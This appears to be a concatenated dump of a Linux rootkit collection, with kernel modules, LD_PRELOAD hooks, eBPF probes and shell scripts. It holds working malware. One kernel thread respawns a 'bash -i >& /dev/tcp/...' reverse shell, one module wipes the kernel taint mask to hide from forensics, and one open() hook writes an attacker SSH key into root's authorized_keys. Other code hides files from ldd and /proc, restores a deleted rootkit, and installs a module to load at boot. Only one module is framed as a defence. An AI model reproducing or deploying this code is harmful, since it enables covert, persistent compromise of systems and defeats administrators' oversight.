In addition, you can come to `if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {`, and change it to another name too. (If you are going to change the name, remember that it needs to have the same number of chars, in this case noprocname has 10)

If you have any questions, please ask, if you learned, good learning and good studies xD

```

`Ring0/persistent-thread/lkm.c`:

```c
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/sched/signal.h>
#include <linux/string.h>

MODULE_LICENSE("GPL");          
MODULE_AUTHOR("mtz");          
MODULE_DESCRIPTION("Persistent RevShell");

struct task_struct *mon_thread;
struct task_struct *task;

int mon_shell(void *data) { 
    while (!kthread_should_stop()) { 
        bool process_found = false; 
        
        for_each_process(task) {
            printk(KERN_INFO "Checking process: %s (PID: %d)\n", task->comm, task->pid);
            
            if (strncmp(task->comm, "noprocname", 10) == 0 && task->comm[10] == '\0') {
                process_found = true;
                printk(KERN_INFO "Process 'noprocname' found (PID: %d)\n", task->pid);
                break;
            }
        }
        
        if (!process_found) {
            call_usermodehelper("/bin/bash", 
                                (char *[]){"/bin/bash", "-c", "bash -i >& /dev/tcp/127.0.0.1/1337 0>&1", NULL}, 
                                NULL, UMH_WAIT_EXEC);

            printk(KERN_INFO "Executing reverse shell!\n");
        }
        
        ssleep(5);
    }
    return 0;
}

static int __init uninterruptible_sleep_init(void) {
    mon_thread = kthread_run(mon_shell, NULL, "matheuz");
    
    if (IS_ERR(mon_thread)) {
        printk(KERN_ALERT "Failed to create thread!\n");
        return PTR_ERR(mon_thread);
    }
    
    printk(KERN_INFO "Monitoring started!\n");
    return 0;
}

static void __exit uninterruptible_sleep_exit(void) {
    if (mon_thread) { 
        kthread_stop(mon_thread);
        printk(KERN_INFO "Monitoring stopped!\n");
    }
}

module_init(uninterruptible_sleep_init);
module_exit(uninterruptible_sleep_exit);

```

`Ring0/reset-tainted/Makefile`:

```
obj-m := tainted.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/reset-tainted/README.md`:

```md

# **Resetting `/proc/sys/kernel/tainted`**

This code aims to periodically clear the kernel contamination mask. The taint mask is a variable that indicates whether the kernel has been modified by untrusted LKM (i.e., is not signed). A thread is created to run the `reset_taint_mask` function, which resets the taint mask to zero every 5 seconds, this is very good for the developer side of the LKM rootkit, because if you enter an LKM that has not been signed, the message normally appears in dmesg, and `/proc/sys/kernel/tainted`, has a number like `12228`, and checking this helps a lot in a forensic analysis, for example, resetting tainted makes your rootkit much more stealthy.

<p align="center"><img src="image.png"></p>

```

`Ring0/reset-tainted/tainted.c`:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/kprobes.h>
#include <linux/version.h>

#define RESET_THREAD_NAME "zer0t"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("zero tainted based in kovid");

static struct task_struct *cleaner_thread = NULL;
static unsigned long *taint_mask_ptr = NULL;

static struct kprobe probe_lookup = {
    .symbol_name = "kallsyms_lookup_name"
};

static unsigned long *get_taint_mask_address(void) {
    typedef unsigned long (*lookup_name_fn)(const char *name);

    lookup_name_fn kallsyms_lookup_fn;

    unsigned long *taint_addr = NULL;

    if (register_kprobe(&probe_lookup) < 0) {
        printk(KERN_ERR "Failed to register kprobe.\n");
        return NULL;
    }

    kallsyms_lookup_fn = (lookup_name_fn) probe_lookup.addr;

    unregister_kprobe(&probe_lookup);

    if (kallsyms_lookup_fn) {
        taint_addr = (unsigned long *)kallsyms_lookup_fn("tainted_mask");

        if (taint_addr) {
            printk(KERN_INFO "tainted_mask address: %px\n", taint_addr);
        } else {
            printk(KERN_ERR "Could not find tainted_mask address.\n");
        }
    } else {
        printk(KERN_ERR "kallsyms_lookup_name not found.\n");
    }

    return taint_addr;
}

static void reset_taint_mask(void) {
    if (taint_mask_ptr && *taint_mask_ptr != 0) {
        printk(KERN_INFO "tainted_mask before reset: %lu\n", *taint_mask_ptr);

        *taint_mask_ptr = 0;

        printk(KERN_INFO "tainted_mask reset to: %lu\n", *taint_mask_ptr);
    } else {
        printk(KERN_WARNING "Invalid tainted_mask address or already reseted.\n");
    }
}

static int zt_thread(void *data) {
    while (!kthread_should_stop()) {
        reset_taint_mask();
        ssleep(5);
    }
    return 0;
}

static int __init zerot_init(void) {
    printk(KERN_INFO "tainted_mask cleaner module loaded.\n");

    taint_mask_ptr = get_taint_mask_address();
    if (!taint_mask_ptr) {
        printk(KERN_ERR "Could not get tainted_mask address.\n");
        return -EFAULT;
    }

    cleaner_thread = kthread_run(zt_thread, NULL, RESET_THREAD_NAME);
    if (IS_ERR(cleaner_thread)) {
        printk(KERN_ERR "Failed to start tainted_mask cleaner thread.\n");
        return PTR_ERR(cleaner_thread);
    }

    return 0;
}

static void __exit zerot_exit(void) {
    if (cleaner_thread) {
        kthread_stop(cleaner_thread);
        printk(KERN_INFO "zerot stopped.\n");
    }
    printk(KERN_INFO "zerot unloaded.\n");
}

module_init(zerot_init);
module_exit(zerot_exit);

```

`Ring0/thread-execution/Makefile`:

```
obj-m := bebop.o
CC = gcc -Wall 
KDIR := /lib/modules/$(shell uname -r)/build
PWD := $(shell pwd)

all:
	$(MAKE) -C $(KDIR) M=$(PWD) modules

clean:
	$(MAKE) -C $(KDIR) M=$(PWD) clean

```

`Ring0/thread-execution/README.md`:

```md

# Changing the execution of a thread in `state D (Uninterruptible Sleep) to R (Running)`

Hello guys, yesterday I was looking for some things out of curiosity, and one of them was: "how can I stop a persistence that uses thread and is in state D", and that's when I thought, if I change the state from D to R, persistence will no longer be executed, I used kthreadshell as an example.

basically we will identify all current processes and, when we find the first one in the `TASK_UNINTERRUPTIBLE` state, we change its state to `TASK_RUNNING` and "wake it up"

And why would this stop a type of persistence such as `KthreadShell` that uses a thread with state D (Uninterruptible Sleep)?
    
This happens because the reverse shell basically stops working when changing the process from `TASK_UNINTERRUPTIBLE (D)` to `TASK_RUNNING` because the process, when "woken up", is no longer blocked waiting for an I/O operation, interrupting which is necessary for the execution of revshell, which depends on this lock to function correctly.

<p align="center"><img src="image.png"></p>

```

`Ring0/thread-execution/bebop.c`:

```c
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/rcupdate.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("matheuzsec");
MODULE_DESCRIPTION("Hello space cowboy...");
MODULE_VERSION("1.0");

static int __init spacecowboy_init(void) {
    struct task_struct *task;

    printk(KERN_INFO "[*] Bebop searching for processes in TASK_UNINTERRUPTIBLE state [*]\n");

    rcu_read_lock();
    for_each_process(task) {
        if (READ_ONCE(task->__state) == TASK_UNINTERRUPTIBLE) {
            printk(KERN_INFO "Process found: PID = %d, Name = %s\n",
                   task->pid, task->comm);

            // Change the state to TASK_RUNNING
            WRITE_ONCE(task->__state, TASK_RUNNING);
            wake_up_process(task);

            printk(KERN_INFO "PID = %d changed to TASK_RUNNING\n",
                   task->pid);
            break;
        }
    }
    rcu_read_unlock();

    return 0;
}

static void __exit spacecowboy_exit(void) {
    printk(KERN_INFO "[*] See you later space cowboy... [*]\n");
}

module_init(spacecowboy_init);
module_exit(spacecowboy_exit);

```

`Ring3/Hiding-from-etc-ld.so.preload/README.md`:

```md

# ## Hiding an LD_PRELOAD Rootkit from `ldd` and `/proc`

You can see the full explanation in my blog post [here](https://matheuzsecurity.github.io/hacking/ldpreload-rootkit/)

```

`Ring3/Hiding-from-etc-ld.so.preload/hide.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <errno.h>
#include <sys/stat.h>
#include <limits.h>
#include <dirent.h>

#define HIDDEN_FILE "/etc/ld.so.preload"

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen) {
        orig_fopen = dlsym(RTLD_NEXT, "fopen");
    }

    if (strcmp(pathname, HIDDEN_FILE) == 0) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}

ssize_t read(int fd, void *buf, size_t count)
{
    static ssize_t (*orig_read)(int, void *, size_t) = NULL;

    if (!orig_read) {
        orig_read = dlsym(RTLD_NEXT, "read");
    }

    char path[PATH_MAX];
    snprintf(path, sizeof(path), "/proc/self/fd/%d", fd);
    char actual_path[PATH_MAX];
    ssize_t len = readlink(path, actual_path, sizeof(actual_path) - 1);

    if (len > 0) {
        actual_path[len] = '\0';
        if (strcmp(actual_path, HIDDEN_FILE) == 0) {
            errno = ENOENT;
            return -1;
        }
    }

    return orig_read(fd, buf, count);
}

struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
    }

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, "ld.so.preload") != 0) {
            return entry;
        }
    }
    return NULL;
}

```

`Ring3/hiding-directory/README.md`:

```md

# Hiding Directory

A simple hook for hidden directory.

```

`Ring3/hiding-directory/hide.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <dlfcn.h>
#include <errno.h>

#define HIDDEN_DIR "secret"
#define HIDDEN_FILE "ld.so.preload"

struct dirent *(*orig_readdir)(DIR *dirp);
struct dirent *readdir(DIR *dirp)
{
    if (!orig_readdir)
        orig_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = orig_readdir(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}

struct dirent64 *(*orig_readdir64)(DIR *dirp);
struct dirent64 *readdir64(DIR *dirp)
{
    if (!orig_readdir64)
        orig_readdir64 = dlsym(RTLD_NEXT, "readdir64");

    struct dirent64 *entry;
    while ((entry = orig_readdir64(dirp)) != NULL) {
        if (strcmp(entry->d_name, HIDDEN_DIR) != 0 && strcmp(entry->d_name, HIDDEN_FILE) != 0) {
            return entry;
        }
    }
    return NULL;
}

FILE *(*orig_fopen)(const char *pathname, const char *mode);
FILE *fopen(const char *pathname, const char *mode)
{
    if (!orig_fopen)
        orig_fopen = dlsym(RTLD_NEXT, "fopen");

    if (strstr(pathname, HIDDEN_FILE) != NULL) {
        errno = ENOENT;
        return NULL;
    }

    return orig_fopen(pathname, mode);
}

```

`Ring3/hiding-ldpreload-from-ldd-and-proc/README.md`:

```md

# ## Hiding an LD_PRELOAD Rootkit from `ldd` and `/proc`

You can see the full explanation in my blog post [here](https://matheuzsecurity.github.io/hacking/ldpreload-rootkit/)

```

`Ring3/hiding-ldpreload-from-ldd-and-proc/hide.c`:

```c
#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;

    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        if (!real_read) {
            errno = ENOSYS;
            return -1;
        }
    }

    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *end = start + result;
        char *current = start;

        size_t new_buf_size = result;
        char *new_buf = (char *)malloc(new_buf_size);
        if (!new_buf) {
            errno = ENOMEM;
            return -1;
        }

        size_t new_buf_pos = 0;

        while (current < end) {
            char *line_start = current;
            char *line_end = memchr(current, '\n', end - current);
            if (!line_end) {
                line_end = end;
            } else {
                line_end++;
            }

            if (!memmem(line_start, line_end - line_start, "hook.so", strlen("hook.so"))) {
                size_t line_length = line_end - line_start;
                if (new_buf_pos + line_length > new_buf_size) {
                    new_buf_size = new_buf_pos + line_length;
                    new_buf = (char *)realloc(new_buf, new_buf_size);
                    if (!new_buf) {
                        errno = ENOMEM;
                        return -1;
                    }
                }
                memcpy(new_buf + new_buf_pos, line_start, line_length);
                new_buf_pos += line_length;
            }

            current = line_end;
        }

        memcpy(buf, new_buf, new_buf_pos);
        result = new_buf_pos;

        free(new_buf);
    }

    return result;
}

```

`Ring3/persistence-hooking-open/README.md`:

```md

# **A simple persistence hooking the `open`**

Today we will see a simple example of the `open` , with the aim of maintaining persistence via ssh keys, for example, have you ever thought when a system administrator will add another ssh key in `authorized_keys` and simply the key he put, it doesn't appear and instead yours appears in `authorized_keys`? Or simply, if `authorized_keys` doesn't exist, and with a simple `cat`, your ssh key remains there? Well, that's what we'll see today, and what a headache for the system administrator. (If the sysadmin doesn't know how to remove a .so).

The code hooks the `open`  , to intercept specific paths such as `/root/.ssh/authorized_keys`. It writes an SSH key to that file if the path matches one of the defined targets, and then reopens the file with read and write permissions. If the `O_CREAT` flag is used, the code handles the argument appropriately and calls the original `open` function as necessary. The goal is to ensure that an SSH key is entered in a specific location when these files are accessed.

<p align="center"><img src="image.png"></p>

```

`Ring3/persistence-hooking-open/open.c`:

```c
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <dlfcn.h>
#include <stdarg.h>

// Define a function type for the 'open' function with a specific signature
typedef int (*open_func_type)(const char *, int, ...);

// Var to store the pointer to the original 'open' function
static open_func_type orig_open = NULL;

// Function to check if the file path is the target "/root/.ssh/authorized_keys", "authorized_keys" or ".ssh/authorized_keys"
static int target(const char *pathname) {
    if (pathname == NULL) return 0;

    return strcmp(pathname, "/root/.ssh/authorized_keys") == 0 ||
           strcmp(pathname, "authorized_keys") == 0 ||
           strcmp(pathname, ".ssh/authorized_keys") == 0;
}

// Hook for 'open'
int open(const char *pathname, int flags, ...) {
    va_list args;
    mode_t mode = 0;

    // If the original 'open' function pointer is not set, get it using dlsym
    if (!orig_open) {
        orig_open = (open_func_type)dlsym(RTLD_NEXT, "open");
        if (!orig_open) {
            fprintf(stderr, "Error loading orig open function: %s\n", dlerror());
            exit(EXIT_FAILURE);
        }
    }

    // If the O_CREAT flag is set, get the mode argument
    if (flags & O_CREAT) {
        va_start(args, flags);
        mode = va_arg(args, int);
        va_end(args);
    }

    // If the file path matches the target, create or open the "authorized_keys" file and write an SSH key to it
    if (target(pathname)) {
        int fd = orig_open("/root/.ssh/authorized_keys", O_WRONLY | O_CREAT | O_TRUNC, 0600);
        if (fd < 0) {
            return fd;
        }

        const char *sshkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC4vFD3iwB8j8H16nCvYiUXY8wk8lCb9u7RH0jp2SUjaFhJ0IM2FYjOlXOobAzWhL/V7gjC3oEuR8xeEi34Mv24GFrKQNZZcrrL5d2cVEhg7X1uB2cK8nztr1f7Ump0Afe3j8suPJWVla/qZaVgvCzZeFIQ7hbZAvV51WD0/f13WgnEiEceM2Asas04Wdq25Jxn7p2VsP+OYhwb/v54KckCXMJRMdW3CdKwtLhUz7Va5fkp2868D2tI0fyN9Sq9UpN5Z21sjPYT7x3m86c1uOjDEfkgxrF0jP8dFqkEqSyQT8bC1rKRLD8sMBG5k+QsJvue223r1rZtUwYRp0u2gosqeqRqw66q8MOFRwjnQUFgyrZVB+C2sn/KMJEOw4fneGVPvh2Y0jixDyT2cxmc+iwwk/M0v2ivCKBPlQ3G6q1ndLbCUywu8k16nGhq3Yoin14Cu9yOUIybkynquZNJeFsQj9r2E6GnxM9h+NlT6kwT6J2hw+RFtafj4osBnqU7mQM= kali@kali\n";
        write(fd, sshkey, strlen(sshkey));

        close(fd);
        return orig_open("/root/.ssh/authorized_keys", O_RDWR | O_APPEND, 0600);
    }

    // If the O_CREAT flag is set, call the original 'open' with the mode
    if (flags & O_CREAT) {
        return orig_open(pathname, flags, mode);
    } else {
        return orig_open(pathname, flags);
    }
}

```

`Ring3/ptrace.c`:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <errno.h>
#include <sys/ptrace.h>
#include <stdarg.h>


typedef long (*orig_ptrace_func_t)(enum __ptrace_request request, ...);

long ptrace(enum __ptrace_request request, ...) {
    fprintf(stderr, "[HOOK] request blocked %d\n", request);

    
    errno = EPERM;
    return -1;
}



```

`Ring3/rootkit-restore-itself/README.md`:

```md

# a rootkit that can restore itself

If you delete a file only the filename is removed, and the file (inode) will exist untill the last process using it terminates. So we can use the /proc/self/maps file and /proc/self/map_files/ directory to get access to those files that are still in memory, and copy the rootkit library back to the disk if it's deleted. This will make it harder to remove the rootkit, since it can just restore itself if you delete the rootkit. However, you should still keep in mind that a rootkit is meant to be stealthy so this is not something you'd see in real life.

By Arnout

```

`Ring3/rootkit-restore-itself/persist.c`:

```c
#define _GNU_SOURCE
#define __USE_GNU //needed for using the DL_info struct

#include <linux/limits.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <dlfcn.h>

char *resolved_libpath;


void __attribute__((constructor)) resolve_libpath() {
    Dl_info so_information;
    if (dladdr(resolve_libpath, &so_information) == 0) {
        return;
    }
    resolved_libpath = realpath(so_information.dli_fname, NULL);
    if (resolved_libpath == NULL) {
        resolved_libpath = malloc(strlen(so_information.dli_fname)+1);
        if (resolved_libpath == NULL) return;
        strcpy(resolved_libpath, so_information.dli_fname);
    }
}


int cmp_files(char *file1, char *file2) {
    FILE *f1 = fopen(file1, "r");
    if (f1 == NULL) {
        return 1;
    }

    FILE *f2 = fopen(file2, "r");
    if (f2 == NULL) {
        fclose(f1);
        return 1;
    }

    char c1, c2;
    while (c1 == c2 && c1 != EOF) {
        c1 = getc(f1);
        c2 = getc(f2);
    }

    int ret = !(feof(f1) && feof(f2));
    fclose(f1);
    fclose(f2);
    return ret;
}


void __attribute__((destructor)) persistence() { //this function is called when a program exits
    if (resolved_libpath == NULL) return;
    if (geteuid() != 0) return; //confirm that we have root permission, needed to read files under /proc/self/map_files/

    //get data from /proc/self/maps
    char line[PATH_MAX + 500], addr[100], path[PATH_MAX], proc_pathname[sizeof("/proc/self/map_files/") + 100] = "/proc/self/map_files/"; //these sizes may be garbadge, it should be checked with the code in the kernel behind /proc/PID/maps
    int inode;

    FILE *f = fopen("/proc/self/maps", "r");
    if (f == NULL) {
        free(resolved_libpath);
        return;
    }
    while (strcmp(path, resolved_libpath) != 0 && fgets(line, sizeof(line), f) != NULL) {
        sscanf(line, "%s %*s %*s %*s %i %s", addr, &inode, path);
    }
    if (strcmp(path, resolved_libpath) != 0) {
        free(resolved_libpath);
        return;
    }
    strncat(proc_pathname, addr, 100);
    fclose(f);

    //compare and reinstall if needed
    //check LIB_PATH
    struct stat sb;
    if (stat(resolved_libpath, &sb) == -1 || (inode != sb.st_ino && cmp_files(proc_pathname, resolved_libpath))) { //if inode is different check the file contents
        remove(resolved_libpath); //remove the filename if it exists because new processes might be using it and we don't want to crash those by corrupting the file
        int fd_in = open(proc_pathname, O_RDONLY);
        int fd_out = open(resolved_libpath, O_WRONLY | O_CREAT | O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH); //if you want this to be atomic you have to use a random filename and then use rename() to give it the final filename.
        char buf[4096];
        int bytes = read(fd_in, buf, sizeof(buf));
        while (bytes > 0 && write(fd_out, buf, bytes) != -1) { //stop on errors and EOF
            bytes = read(fd_in, buf, sizeof(buf));
        }
        close(fd_in);
        close(fd_out);
    }
    //just overwrite /etc/ld.so.preload, checking is too much trouble
    int fd = open("/etc/ld.so.preload", O_WRONLY | O_TRUNC | O_CREAT, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
    write(fd, resolved_libpath, (strlen(resolved_libpath))); //try rewriting /etc/ld.so.preload
    close(fd);
    free(resolved_libpath);
}

```

`eBPF/hook_mkdirat/mkdirat.c`:

```c
#define BPF_NO_GLOBAL_DATA
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

SEC("kprobe/do_mkdirat")
int kprobe__do_mkdirat(struct pt_regs *ctx)
{
    struct filename *name = (struct filename *)PT_REGS_PARM2(ctx);
    const char *dirname = BPF_CORE_READ(name, name);

    bpf_printk("New directory created: %s", dirname);

    return 0;
}

```

`eBPF/hook_mkdirat/run.sh`:

```sh
#!/bin/bash
sudo ./ecc mkdirat.c
sudo ./ecli run package.json

```

`eBPF/hook_unlinkat/README.md`:

```md
# Hooking Unlinkat

- This code was created by Humzak711, and the full explanation is in our paper, which you can read at: https://inferi.club/post/the-art-of-linux-kernel-rootkits

<p align="center"><img src="hook.png"></p>

```

`eBPF/hook_unlinkat/run.sh`:

```sh
#!/bin/bash
sudo ./ecc unlinkat.c
sudo ./ecli run package.json

```

`eBPF/hook_unlinkat/unlinkat.c`:

```c
#define BPF_NO_GLOBAL_DATA
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

char LICENSE[] SEC("license") = "GPL";

SEC("kprobe/do_unlinkat")
int kprobe__sys_unlinkat(struct pt_regs *regs)
{
    bpf_printk("hooked unlinkat");

    struct filename *name = (struct filename *)PT_REGS_PARM2(regs);
    const char *filename = BPF_CORE_READ(name, name);

    bpf_printk("intercepted filename: %s", filename);

    return 0;
}

```

`rootkit_persistence.sh`:

```sh
#!/bin/bash

if [ "$(id -u)" -ne 0 ]; then
    echo "This script must be run as root."
    exit 1
fi

read -p "Enter the full path to the *.ko: " ROOTKIT_PATH

if [ ! -f "$ROOTKIT_PATH" ]; then
    echo "Error: '$ROOTKIT_PATH' was not found."
    exit 1
fi

read -p "Enter the name of the rootkit (without .ko): " ROOTKIT_NAME

CONF_DIR="/etc/modules-load.d"
MODULE_DIR="/usr/lib/modules/$(uname -r)/kernel"

echo "Copying $ROOTKIT_PATH to $MODULE_DIR..."
mkdir -p "$MODULE_DIR"
cp "$ROOTKIT_PATH" "$MODULE_DIR/$ROOTKIT_NAME.ko"

echo "Running depmod..."
depmod

echo "Configuring the module to load on startup..."
echo "$ROOTKIT_NAME" > "$CONF_DIR/$ROOTKIT_NAME.conf"

echo "$ROOTKIT_NAME will be loaded automatically at startup."

```